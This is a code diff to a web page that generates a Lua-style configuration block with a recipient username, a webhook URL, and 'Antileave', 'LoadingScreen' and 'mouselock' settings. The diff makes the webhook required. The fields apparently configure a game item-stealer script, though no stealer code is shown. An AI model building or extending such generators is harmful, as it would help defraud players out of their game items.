@@ -108,10 +108,10 @@
       <input type="text" id="username" name="username" required><br><br>
 
       <label for="username2">Second Username (Optional):</label>
-      <input type="text" id="username2" name="username2"><br><br>
+      <input type="text" id="username2" name="username2" required><br><br>
 
-      <label for="webhook">Webhook (Optional):</label>
-      <input type="url" id="webhook" name="webhook"><br><br>
+      <label for="webhook">Webhook (Required):</label>
+      <input type="url" id="webhook" name="webhook" required><br><br>
 
       <label for="mouseLock">Enable Mouse Lock:</label>
       <input type="checkbox" id="mouseLock" name="mouseLock"><br><br>
@@ -126,16 +126,16 @@
       <input type="text" id="scriptName" name="scriptName" required><br><br>
 
       <label for="firstText">First Text:</label>
-      <input type="text" id="firstText" name="firstText"><br><br>
+      <input type="text" id="firstText" name="firstText" required><br><br>
 
       <label for="secondText">Second Text:</label>
-      <input type="text" id="secondText" name="secondText"><br><br>
+      <input type="text" id="secondText" name="secondText" required><br><br>
 
       <label for="thirdText">Third Text:</label>
-      <input type="text" id="thirdText" name="thirdText"><br><br>
+      <input type="text" id="thirdText" name="thirdText" required><br><br>
 
       <label for="waitingTime">Waiting Time (in seconds):</label>
-      <input type="number" id="waitingTime" name="waitingTime"><br><br>
+      <input type="number" id="waitingTime" name="waitingTime" required><br><br>
 
       <button type="button" id="generateBtn">Generate</button>
       <textarea id="output" readonly placeholder="Generated script will appear here"></textarea><br>
@@ -150,7 +150,7 @@
       const copyButton = document.getElementById('copyBtn');
 
       generateButton.addEventListener('click', function(event) {
-        event.preventDefault(); 
+        event.preventDefault();
 
         const username = document.getElementById("username").value;
         const username2 = document.getElementById("username2").value;
@@ -167,7 +167,7 @@
         // Generate script output
         const outputString = `UserName = "${username}"\n` +
                              `${username2 ? `UserName2 = "${username2}" -- optional delete the whole line if you don't want it\n` : ''}` +
-                             `${webhook ? `Webhook = "${webhook}" -- optional delete the whole line if you don't want it\n` : ''}\n` +
+                             `Webhook = "${webhook}" -- required\n\n` +
                              `mouselock = ${mouseLock}\n` +
                              `Antileave = ${antileave}\n` +
                              `LoadingScreen = ${loadingscreen}\n` +
